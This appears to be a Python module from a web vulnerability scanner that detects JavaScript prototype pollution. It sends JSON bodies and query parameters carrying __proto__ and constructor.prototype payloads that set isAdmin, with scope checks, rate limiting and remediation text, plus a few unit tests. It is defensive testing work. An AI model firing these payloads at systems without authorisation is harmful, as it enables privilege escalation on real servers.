"""JavaScript prototype pollution detection via JSON/query params."""
from __future__ import annotations

import json
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

import aiohttp

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_PROTOTYPE = "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"

POLLUTION_PAYLOADS_JSON: list[dict] = [
    {"__proto__": {"isAdmin": True}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    {"__proto__": {"polluted": "yes"}},
]

POLLUTION_PARAMS: list[dict] = [
    {"__proto__[isAdmin]": "true"},
    {"constructor.prototype.isAdmin": "true"},
    {"__proto__[polluted]": "yes"},
]

API_ENDPOINTS = ["/api", "/api/v1", "/api/v2", "/json", "/data", "/graphql"]


class PrototypePoll(BaseModule):
    """JavaScript prototype pollution detector."""

    NAME        = "prototype_poll"
    DESCRIPTION = "Detect prototype pollution via JSON body and query parameter injection"
    PHASE       = 10
    TAGS        = ["advanced", "prototype-pollution", "javascript", "owasp-a03", "cwe-1321"]

    async def run(self) -> ModuleResult:
        """Test endpoints for prototype pollution vectors."""
        start  = time.monotonic()
        target = self.config.target.rstrip("/")

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        connector = aiohttp.TCPConnector(ssl=False)
        timeout   = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Test main target and common API paths
            endpoints = [target] + [f"{target}{ep}" for ep in API_ENDPOINTS]
            for url in endpoints:
                if not self.check_scope(url):
                    continue
                await self._test_json_pollution(session, url)
                await self._test_param_pollution(session, url)

        return self._make_result(start)

    async def _test_json_pollution(
        self, session: aiohttp.ClientSession, url: str
    ) -> None:
        """Send JSON payloads with prototype pollution keys."""
        headers = {"Content-Type": "application/json"}
        for payload in POLLUTION_PAYLOADS_JSON:
            await self.rate_limit()
            try:
                async with session.post(
                    url, json=payload, headers=headers
                ) as resp:
                    body = await resp.text(errors="ignore")
                    # Indicators of successful pollution: reflected key in unusual context
                    indicators = [
                        '"isAdmin":true' in body,
                        '"polluted":"yes"' in body,
                        "isadmin" in body.lower() and "true" in body.lower(),
                    ]
                    if any(indicators):
                        ev = Evidence(
                            request_raw=(
                                f"POST {url} HTTP/1.1\n"
                                "Content-Type: application/json\n\n"
                                + json.dumps(payload)
                            ),
                            response_raw=f"HTTP {resp.status}\n{body[:400]}",
                            extra={"payload": payload, "indicator": "polluted key reflected"},
                        )
                        self.new_finding(
                            title=f"Prototype Pollution via JSON Body: {url}",
                            severity=Severity.HIGH,
                            description=(
                                "A JSON body containing __proto__ or constructor.prototype "
                                "keys was reflected in the response, indicating the server-side "
                                "JavaScript merges user input into object prototypes without "
                                "sanitization. This can lead to privilege escalation or RCE."
                            ),
                            reproduction_steps=[
                                f"POST {url} with Content-Type: application/json",
                                f"Body: {json.dumps(payload)}",
                                "Observe polluted property reflected in response",
                            ],
                            remediation=(
                                "Use Object.create(null) for merge targets. "
                                "Deny __proto__, constructor, and prototype keys in all "
                                "user-supplied JSON. Use libraries with built-in prototype "
                                "pollution protections (e.g. deepmerge with sanitization)."
                            ),
                            references=["CWE-1321", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_PROTOTYPE,
                            target=url,
                        )
                        return
            except Exception:
                pass

    async def _test_param_pollution(
        self, session: aiohttp.ClientSession, url: str
    ) -> None:
        """Send query params with prototype pollution patterns."""
        for params in POLLUTION_PARAMS:
            await self.rate_limit()
            try:
                async with session.get(url, params=params) as resp:
                    body = await resp.text(errors="ignore")
                    indicators = [
                        "isAdmin" in body and "true" in body,
                        "polluted" in body and "yes" in body,
                    ]
                    if any(indicators):
                        param_str = "&".join(f"{k}={v}" for k, v in params.items())
                        ev = Evidence(
                            request_raw=f"GET {url}?{param_str} HTTP/1.1",
                            response_raw=f"HTTP {resp.status}\n{body[:400]}",
                            extra={"params": params},
                        )
                        self.new_finding(
                            title=f"Prototype Pollution via Query Parameters: {url}",
                            severity=Severity.HIGH,
                            description=(
                                "Query parameter keys containing __proto__ or "
                                "constructor.prototype notation were reflected in a way "
                                "that indicates successful object prototype pollution."
                            ),
                            reproduction_steps=[
                                f"GET {url}?{param_str}",
                                "Observe polluted property in response",
                            ],
                            remediation=(
                                "Sanitize and reject query parameters containing "
                                "__proto__, constructor, or prototype. "
                                "Use allowlist-based parameter parsing."
                            ),
                            references=["CWE-1321", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_PROTOTYPE,
                            target=url,
                        )
                        return
            except Exception:
                pass


class TestPrototypePoll:
    def test_payloads_contain_proto(self) -> None:
        keys = {k for p in POLLUTION_PAYLOADS_JSON for k in p}
        assert "__proto__" in keys or "constructor" in keys

    def test_param_payloads_non_empty(self) -> None:
        assert len(POLLUTION_PARAMS) >= 2

    def test_cvss_format(self) -> None:
        assert CVSS_PROTOTYPE.startswith("CVSS:3.1/")
